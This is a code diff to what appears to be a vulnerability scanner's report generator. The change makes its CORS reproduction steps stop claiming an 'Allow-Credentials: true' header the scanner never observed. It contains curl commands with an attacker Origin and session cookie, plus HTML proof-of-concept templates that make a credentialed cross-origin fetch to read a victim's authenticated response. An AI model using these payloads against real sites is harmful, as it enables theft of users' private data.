@@ -797,36 +797,81 @@ def _cors_concrete_repro(finding: dict[str, Any], url: str, pe: dict[str, Any]) 
     hdr_parts = [h.strip() for h in matched.split(";") if h.strip()]
     acao = next((h for h in hdr_parts if h.lower().startswith("access-control-allow-origin")),
                 f"Access-Control-Allow-Origin: {origin}")
-    acac = next((h for h in hdr_parts if "allow-credentials" in h.lower()),
-                "Access-Control-Allow-Credentials: true")
+    # Did the target ACTUALLY return Allow-Credentials: true? The prover emits a separate
+    # "reflects arbitrary Origin (no credentials)" finding for the case where it did not, so the
+    # repro must not paper over the difference. It used to: the header fell back to a hard-coded
+    # "Access-Control-Allow-Credentials: true" and step 3 then told the triager to OBSERVE a header
+    # the engine had proved absent, with steps 4-5 building a credentialed-read impact on top of it.
+    # A triager who follows that, sees no such header, and finds the PoC read nothing closes the
+    # report as invalid — and rightly.
+    acac = next((h for h in hdr_parts if "allow-credentials" in h.lower()), "")
+    credentialed = acac.lower().rstrip().endswith("true")
     # Single-line steps (normalize_steps splits on newline, so keep each on one line).
     curl = f"curl -i -H 'Origin: {origin}' -H 'Cookie: <YOUR authenticated session cookie>' '{url}'"
-    steps = [
-        "Log in to the target as a normal user and copy your session cookie / Authorization header from the browser devtools Network tab.",
-        f"From an origin you control (not the target), replay the request with an attacker Origin plus your credentials: `{curl}`",
-        f"Observe that the response reflects the attacker Origin and permits credentials — the misconfiguration: `{acao}` together with `{acac}`.",
-        "Because credentials are allowed for a reflected/untrusted Origin, a page on the attacker origin can read the authenticated response. Save the Proof of concept below as an .html file, host it on an origin you control, and open it in a browser that is logged in to the target.",
-        "The PoC performs a credentialed `fetch(..., {credentials:'include'})` and prints the victim's authenticated response body — that readable cross-origin data is the demonstrated impact.",
-    ]
-    poc = (
-        "<!doctype html>\n"
-        "<meta charset=\"utf-8\">\n"
-        "<title>CORS PoC — cross-origin read with victim credentials</title>\n"
-        f"<h3>CORS PoC: reading {url} cross-origin with the victim's credentials</h3>\n"
-        "<p>Open this page (hosted on an attacker-controlled origin) in a browser logged in to the target.</p>\n"
-        "<pre id=\"out\">running…</pre>\n"
-        "<script>\n"
-        f"fetch({json.dumps(url)}, {{ credentials: \"include\" }})\n"
-        "  .then(function (r) { return r.text(); })\n"
-        "  .then(function (body) {\n"
-        "    document.getElementById(\"out\").textContent =\n"
-        "      \"VULNERABLE — read \" + body.length + \" bytes of the victim's authenticated response cross-origin:\\n\\n\" + body;\n"
-        "  })\n"
-        "  .catch(function (e) {\n"
-        "    document.getElementById(\"out\").textContent = \"Not vulnerable / blocked by the browser: \" + e;\n"
-        "  });\n"
-        "</script>\n"
-    )
+    if credentialed:
+        steps = [
+            "Log in to the target as a normal user and copy your session cookie / Authorization header from the browser devtools Network tab.",
+            f"From an origin you control (not the target), replay the request with an attacker Origin plus your credentials: `{curl}`",
+            f"Observe that the response reflects the attacker Origin and permits credentials — the misconfiguration: `{acao}` together with `{acac}`.",
+            "Because credentials are allowed for a reflected/untrusted Origin, a page on the attacker origin can read the authenticated response. Save the Proof of concept below as an .html file, host it on an origin you control, and open it in a browser that is logged in to the target.",
+            "The PoC performs a credentialed `fetch(..., {credentials:'include'})` and prints the victim's authenticated response body — that readable cross-origin data is the demonstrated impact.",
+        ]
+    else:
+        # Reflection only. State exactly what was captured, and name the missing precondition
+        # rather than asserting impact the evidence does not support.
+        steps = [
+            f"From an origin you control (not the target), replay the request with an attacker Origin: `curl -i -H 'Origin: {origin}' '{url}'`",
+            f"Observe that the response reflects the attacker Origin back: `{acao}`.",
+            "Confirm what was NOT observed: the response carries no `Access-Control-Allow-Credentials: true`, so a browser will not attach or expose the victim's credentials on this cross-origin read.",
+            "Assess reachable impact before reporting: reflection alone exposes only data the endpoint already serves unauthenticated. Check whether this endpoint returns anything sensitive without a session, or whether another route on the same origin reflects the Origin AND allows credentials.",
+            "Report as a reflected-Origin misconfiguration, not as an authenticated cross-origin read, unless you can capture the credentialed variant.",
+        ]
+    if credentialed:
+        poc = (
+            "<!doctype html>\n"
+            "<meta charset=\"utf-8\">\n"
+            "<title>CORS PoC — cross-origin read with victim credentials</title>\n"
+            f"<h3>CORS PoC: reading {url} cross-origin with the victim's credentials</h3>\n"
+            "<p>Open this page (hosted on an attacker-controlled origin) in a browser logged in to the target.</p>\n"
+            "<pre id=\"out\">running…</pre>\n"
+            "<script>\n"
+            f"fetch({json.dumps(url)}, {{ credentials: \"include\" }})\n"
+            "  .then(function (r) { return r.text(); })\n"
+            "  .then(function (body) {\n"
+            "    document.getElementById(\"out\").textContent =\n"
+            "      \"VULNERABLE — read \" + body.length + \" bytes of the victim's authenticated response cross-origin:\\n\\n\" + body;\n"
+            "  })\n"
+            "  .catch(function (e) {\n"
+            "    document.getElementById(\"out\").textContent = \"Not vulnerable / blocked by the browser: \" + e;\n"
+            "  });\n"
+            "</script>\n"
+        )
+    else:
+        # No Allow-Credentials was observed, so a credentialed fetch would be a claim, not a
+        # demonstration. Show the reflection that WAS captured and say plainly what it does and
+        # does not prove.
+        poc = (
+            "<!doctype html>\n"
+            "<meta charset=\"utf-8\">\n"
+            "<title>CORS PoC — reflected Origin (unauthenticated cross-origin read)</title>\n"
+            f"<h3>CORS PoC: {url} reflects an attacker Origin</h3>\n"
+            "<p>Open this page on an origin you control. The target returned no "
+            "<code>Access-Control-Allow-Credentials: true</code>, so this reads only what the "
+            "endpoint serves WITHOUT a session — it is not an authenticated cross-origin read.</p>\n"
+            "<pre id=\"out\">running…</pre>\n"
+            "<script>\n"
+            f"fetch({json.dumps(url)})\n"
+            "  .then(function (r) { return r.text(); })\n"
+            "  .then(function (body) {\n"
+            "    document.getElementById(\"out\").textContent =\n"
+            "      \"Reflected Origin allowed an UNAUTHENTICATED cross-origin read of \" + body.length +\n"
+            "      \" bytes. Assess whether this data is sensitive:\\n\\n\" + body;\n"
+            "  })\n"
+            "  .catch(function (e) {\n"
+            "    document.getElementById(\"out\").textContent = \"Blocked by the browser: \" + e;\n"
+            "  });\n"
+            "</script>\n"
+        )
     return steps, poc
 
 
